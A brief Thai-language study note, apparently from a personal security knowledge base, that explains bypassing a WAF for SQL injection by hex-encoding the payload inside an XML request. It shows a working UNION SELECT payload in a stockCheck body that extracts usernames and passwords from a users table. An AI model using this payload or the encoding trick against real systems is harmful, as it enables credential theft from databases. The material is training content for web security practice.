# 🛡️ 4. SQL Injection with Filter Bypass via XML Encoding

## 🎯 Concept
บางเว็บมี WAF กรอง SQL keyword — **XML encoding (hex entities)** ช่วย bypass ได้

## 📝 ตัวอย่าง Request

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>5</productId>
  <storeId>
    <@hex_entities>1 UNION SELECT username||'-'||password FROM users--</@hex_entities>
  </storeId>
</stockCheck>
```

## 🔑 จุดสำคัญ
- `<@hex_entities>...</@hex_entities>` — tag ที่ใช้ครอบ payload เพื่อแปลงเป็น hex entities
- WAF จะเห็นแค่ hex encoded string → ไม่เจอ keyword `UNION`, `SELECT`
- Server side XML parser แปลง hex กลับเป็น SQL → **execute ปกติ**

## 🔗 ดูเพิ่ม
- [[01-SQL-Basic|SQL พื้นฐาน]]
- [[02-Blind-SQL|Blind SQL Injection]]

#sql-injection #waf-bypass #xml-encoding
